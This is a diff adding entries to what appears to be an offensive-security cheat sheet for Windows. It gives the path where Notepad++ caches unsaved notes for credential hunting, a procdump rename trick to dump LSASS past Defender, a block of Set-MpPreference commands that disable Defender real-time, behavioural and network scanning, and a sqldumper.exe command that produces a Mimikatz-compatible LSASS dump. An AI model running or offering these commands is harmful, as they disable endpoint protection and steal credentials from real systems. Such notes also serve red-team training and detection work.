@@ -50,7 +50,34 @@ https://docs.splunksecurityessentials.com/content-detail/certutil_download_with_
 
 
 
+# Notepad cache
+
+[lazy]People like me use Notepad++ as a note-taking thing. We create a 'new', then never get around to saving them.
+
+They get cached here:
+C:\Users\{username}\AppData\Roaming\Notepad++\backup
+
+# Procdump.exe 
+
+If you rename procdump.exe to dump64.exe and place it in the "C:\Program Files (x86)\Microsoft Visual Studio\*" folder, you can bypass Defender and dump LSASS.
 
 
+# Disable Defender 
 
+shell Set-MpPreference -DisableRealtimeMonitoring $true 
+shell Set-MpPreference -EnableRealtimeMonitoring $true
+Set-MpPreference -DisableArchiveScanning $true
+Set-MpPreference -DisableBehaviorMonitoring $true
+Set-MpPreference -DisableIOAVProtection $true
+Set-MpPreference -DisableIntrusionPreventionSystem $true
+Set-MpPreference -DisableScanningNetworkFiles $true
+Set-MpPreference -MAPSReporting 0
+Set-MpPreference -DisableCatchupFullScan $True
+Set-MpPreference -DisableCatchupQuickScan $True
+
+# SQldumper LSASS
+
+0x01100:40 flag will create a Mimikatz compatible dump file.
+sqldumper.exe 540 0 0x01100:40
+Usecase: Dump LSASS.exe to Mimikatz compatible dump using PID.
 
